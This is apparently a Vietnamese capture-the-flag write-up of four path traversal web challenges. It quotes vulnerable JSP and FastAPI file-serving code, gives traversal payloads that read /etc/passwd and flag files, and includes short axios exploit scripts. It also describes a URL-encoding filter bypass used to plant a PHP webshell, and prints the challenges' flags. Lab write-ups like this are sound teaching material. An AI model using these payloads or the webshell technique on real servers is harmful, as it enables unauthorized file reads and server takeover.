# Path traversal

## Under Construction

link: https://battle.cookiearena.org/challenges/web/under-construction

![image](https://hackmd.io/_uploads/SJvNzZXpT.png)

### Phân tích 
- chúng ta cần đọc flag ở file ```/flag.txt```

vào trang web mình được 1 file ảnh 

![image](https://hackmd.io/_uploads/HJXeQWQ6p.png)

Ctrl + U

![image](https://hackmd.io/_uploads/S1VMXWQpa.png)

mình đọc source code được 

```java!
<%@ page trimDirectiveWhitespaces="true" %>
<%
String filepath = getServletContext().getRealPath("resources") + "/";
String _file = request.getParameter("file");

response.setContentType("image/jpeg");
try{
    java.io.FileInputStream fileInputStream = new java.io.FileInputStream(filepath + _file);
    int i;   
    while ((i = fileInputStream.read()) != -1) {  
        out.write(i);
    }   
    fileInputStream.close();
}catch(Exception e){
    response.sendError(404, "Not Found !" );
}
%>
```

- chúng ta có thể thấy lab chỉ lấy tên file và gắn vào đường dẫn thư mục hiện tại không có validate
- 
### Khai thác

- mình tiến hành thử các payload path traversal và thành công với ```../../../../../../etc/passwd```



![image](https://hackmd.io/_uploads/Hy5SQZ766.png)

và mình đọc được flag là **CHH{unD3R_cOns7rUcTI0N_12e0e40383a65d5ca8845f2a8db826f5}**

![image](https://hackmd.io/_uploads/rJqcQb7pT.png)

mình đã viết lại script khai thác

```typescript!
import axios from "axios";

const url: string = "http://103.97.125.56:32550";
axios
  .get(url + "/image.jsp?file=../../../../../../flag.txt")
  .then((response) => console.log(response.data));
```


## File Download

link: https://battle.cookiearena.org/challenges/web/file-download

![image](https://hackmd.io/_uploads/r1aJv-7pa.png)


### Phân tích 

mình thử tạo 1 file có tên là abc.txt và upload lên web 

![image](https://hackmd.io/_uploads/BJwqdWQaa.png)

sau đó web đưa chúng ta đến đường dẫn để có thể đọc được file 

![image](https://hackmd.io/_uploads/rk2ytZm6a.png)

và để ý trên url mình thấy có params name có giá trị là file mình vừa tạo ```?name=abc.txt```


### Khai thác

vào repeater mình thử tấn công path traversal và đọc được file /etc/passwd


![image](https://hackmd.io/_uploads/H1qFdWXp6.png)

và mình đọc được flag là **CHH{eASy_DoWN104d_F1L3_d342c04af27a998002638e5e4f6c1a69}**

![image](https://hackmd.io/_uploads/B1vuYW76a.png)

mình đã viết lại script khai thác

```typescript!
import axios from "axios";

const url: string = "http://103.97.125.56:32171";
axios
  .get(
    url +
      "/read?name=../../../../../../../../../../../../../../../../../../../../../../../../flag.txt"
  )
  .then((response) => console.log(response.data));
```


## Baby OS Path

link: https://battle.cookiearena.org/challenges/web/baby-os-path

![image](https://hackmd.io/_uploads/S14d5-Xp6.png)

### Phân tích 

![image](https://hackmd.io/_uploads/BJMh9WQTa.png)

đọc source code được 

```python!
# Serve static files
@ app.get("/{px:path}")
def serve_frontend(px: str):
    root_dir = "statics"
    file_path = os.path.join(root_dir, px)

    if "etc" in file_path:
        return "Deny"

    if (os.path.exists(file_path)) and os.path.isfile(file_path):
        return FileResponse(file_path)
    else:
        return FileResponse(os.path.join(root_dir, "index.html"))
```

- @app.get("/{px:path}"): Đây là một decorator định nghĩa một route cho ứng dụng FastAPI. Đường dẫn của route này được chỉ định bằng {px:path}, với path là một biến được sử dụng để biểu thị một phần của URL.

- root_dir = "statics": Đây là thư mục gốc chứa các tệp tĩnh.

- file_path = os.path.join(root_dir, px): Đường dẫn đến tệp được yêu cầu được xây dựng bằng cách kết hợp root_dir với phần đường dẫn được truyền từ URL.

- if "etc" in file_path: return "Deny": Điều này kiểm tra xem có chứa chuỗi "etc" trong đường dẫn của tệp được yêu cầu không. Nếu có, nó trả về một thông báo từ chối.


![image](https://hackmd.io/_uploads/HkuB0b7p6.png)

- if (os.path.exists(file_path)) and os.path.isfile(file_path): return FileResponse(file_path): Điều này kiểm tra xem tệp được yêu cầu có tồn tại và là một tệp (không phải là thư mục) hay không. Nếu có, nó trả về nội dung của tệp đó thông qua FileResponse.

- else: return FileResponse(os.path.join(root_dir, "index.html")): Nếu tệp không tồn tại hoặc không phải là một tệp, nó sẽ trả về nội dung của trang index.html trong thư mục statics.

### Khai thác
vậy mình tấn công path traversal với payload sau 
```!
/../../../../../../../../../flag.txt
```

và được flag là **CHH{pls_ReAD_C4refully_Docs_Os_PaTH_cd4b96d927832f0cabf7c655941a4ec1}**

![image](https://hackmd.io/_uploads/Hk7lAWXTa.png)


## Upload File Path Traversal

link: https://battle.cookiearena.org/challenges/web/upload-file-path-traversal

![image](https://hackmd.io/_uploads/Hklz1GXa6.png)

### Phân tích

mình upload 1 file ảnh bình thường và thành công 

![image](https://hackmd.io/_uploads/HJOu1GX6T.png)

thay đổi đuôi file thành anh.php và vẫn thành công

![image](https://hackmd.io/_uploads/HkbyeGmpT.png)

nhưng khi đọc file thì mình không được phép 
- có thể trong thư mục này đã chặn thực thi code php 

![image](https://hackmd.io/_uploads/HyHeWzm6T.png)

- vậy mình cần tìm cách để upload file lên 1 thư mục khác và có thể tại đó sẽ được phép chạy code php


### Khai thác

ký tự "../" bị filter và mình url encode và thành công
- cùng với đó mình tạo 1 webshell để tương tác với hệ thống qua parameter cmd

![image](https://hackmd.io/_uploads/H12wTSXpp.png)


![image](https://hackmd.io/_uploads/SyfbABXpp.png)

file mình cần đọc là **flagiiio0.txt**

![image](https://hackmd.io/_uploads/BJdS0BmTp.png)

và mình được flag là **CHH{uPl04d_vIA_P4tH_Trav3r54L_8f2630c303b41e28773a3f174331e6c2}**

![image](https://hackmd.io/_uploads/HJbuASQap.png)
